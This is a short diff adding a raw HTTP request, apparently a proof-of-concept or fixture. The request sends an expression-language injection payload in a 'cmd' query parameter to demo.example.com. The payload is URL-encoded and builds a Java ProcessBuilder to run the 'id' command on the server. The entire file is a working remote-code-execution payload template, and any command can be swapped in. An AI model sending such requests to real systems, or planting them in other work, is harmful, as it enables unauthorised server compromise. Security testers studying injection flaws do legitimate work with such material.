@@ -1,0 +1,4 @@
+GET /a?cmd=%23%7Bnew%2Bjava.lang.ProcessBuilder%28%7B%27id%27%7D%29.start%28%29%7D HTTP/1.1
+Host: demo.example.com
+Connection: close
+
